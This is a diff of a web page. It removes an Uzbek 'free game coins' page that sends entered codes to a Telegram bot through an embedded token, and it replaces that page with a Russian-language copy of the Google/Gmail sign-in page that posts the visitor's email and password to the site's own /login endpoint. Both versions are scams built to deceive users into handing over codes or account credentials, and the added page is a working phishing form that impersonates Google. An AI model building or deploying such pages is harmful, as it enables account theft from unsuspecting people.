@@ -1,87 +1,89 @@
 <!DOCTYPE html>
-<html lang="uz">
+<html lang="ru">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>DLS Kod</title>
-  <style>
-    body {
-      margin: 0;
-      background-color: #000;
-      color: white;
-      font-family: Arial, sans-serif;
-    }
-    .container {
-      max-width: 400px;
-      margin: 60px auto;
-      padding: 20px;
-      text-align: center;
-    }
-    h1 {
-      font-size: 20px;
-      color: #00ffcc;
-      margin-bottom: 20px;
-    }
-    input[type="text"] {
-      width: 100%;
-      padding: 10px;
-      border-radius: 5px;
-      border: none;
-      font-size: 14px;
-    }
-    button {
-      margin-top: 15px;
-      padding: 10px 20px;
-      font-size: 15px;
-      background-color: #00cc66;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-    #message {
-      margin-top: 15px;
-      font-weight: bold;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail</title>
+    <link rel="icon" href="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico" type="image/x-icon">
+    <style>
+        body {
+            font-family: 'Google Sans', 'Noto Sans Myanmar UI', arial, sans-serif;
+            background-color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #202124;
+        }
+        .container {
+            background: #fff;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            width: 100%;
+            max-width: 450px;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
+        }
+        .google-logo {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        .google-logo img {
+            width: 75px;
+        }
+        h1 {
+            font-size: 24px;
+            margin: 0 0 24px;
+            font-weight: normal;
+            text-align: center;
+        }
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        button {
+            background-color: #1a73e8;
+            color: white;
+            padding: 12px;
+            border: none;
+            width: 100%;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-top: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #1669c1;
+        }
+        .footer {
+            margin-top: 24px;
+            text-align: center;
+            font-size: 12px;
+            color: #5f6368;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <h1>DLS TANGA 🪙 OLMOZ 💎 OLISH UCHUN ODAM QUSHISH KODNI KIRITING</h1>
-    <input type="text" id="userCode" placeholder="Masalan: GFHRB" />
-    <button onclick="submitCode()">Kod yuborish</button>
-    <div id="message"></div>
-  </div>
-
-  <script>
-    function submitCode() {
-      const kod = document.getElementById("userCode").value.trim();
-      const msg = document.getElementById("message");
-      msg.textContent = "";
-
-      if (!kod) return;
-
-      const vaqt = new Date().toLocaleString();
-      const text = `📥 Yangi kod:%0A%0A🔢 Kod: ${encodeURIComponent(kod)}%0A🕒 Vaqt: ${encodeURIComponent(vaqt)}`;
-
-      fetch("https://api.telegram.org/bot8132831494:AAHLt-ociDZXqqn9sWCPWG49Jdp23VoOXDo/sendMessage?chat_id7115503038&text=" + text)
-        .then(res => res.json())
-        .then(data => {
-          if (data.ok) {
-            msg.style.color = "lime";
-            msg.textContent = "✅ KOD YUBORILDI. KODINGIZ TO‘G‘RI BO‘LSA KOIN VA OLMOZ BERILADI!";
-          } else {
-            msg.style.color = "red";
-            msg.textContent = "❌ Xatolik yuz berdi!";
-          }
-        })
-        .catch(() => {
-          msg.style.color = "red";
-          msg.textContent = "❌ Internet bilan muammo bor!";
-        });
-
-      document.getElementById("userCode").value = "";
-    }
-  </script>
+    <div class="container">
+        <div class="google-logo">
+            <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+        </div>
+        <h1>Вход</h1>
+        <form method="POST" action="/login">
+            <input type="email" name="email" placeholder="Электронная почта или номер телефона" required>
+            <input type="password" name="password" placeholder="Введите пароль" required>
+            <button type="submit">Далее</button>
+        </form>
+        <div class="footer">
+            Google LLC © 2025
+        </div>
+    </div>
 </body>
 </html>
